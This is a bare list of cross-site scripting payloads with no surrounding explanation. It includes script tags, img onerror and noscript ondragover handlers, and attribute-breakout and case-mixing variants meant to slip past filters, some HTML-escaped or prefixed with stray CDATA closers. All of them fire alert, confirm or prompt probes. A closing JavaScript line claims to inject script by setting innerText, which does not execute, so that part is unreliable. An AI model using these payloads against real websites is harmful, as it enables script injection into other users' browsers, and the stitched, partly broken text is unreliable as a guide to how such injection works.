<script>alert('xss.js')</script>
"'><img src=q onerror="alert('xss.js')">
"/><img src=q onerror=oNloaD=confirm('xss.js')>
]]>&lt;script&gt;alert('XSS js')&lt;/script&gt;

&lt;script&gt;OnMouseover=prompt('document.cookie')&lt;/script&gt;

&lt;img src=q onerror="alert('xss.js')"&gt;
]]>&lt;noscript ondragover=alert('xss.js') contenteditable>drop here&lt;/noscript&gt;

<span>greatlife</span> and 
// Assuming you have access to JavaScript to manipulate the DOM
document.querySelector('a span').innerText = '<script>alert("XSS.js")</script>';
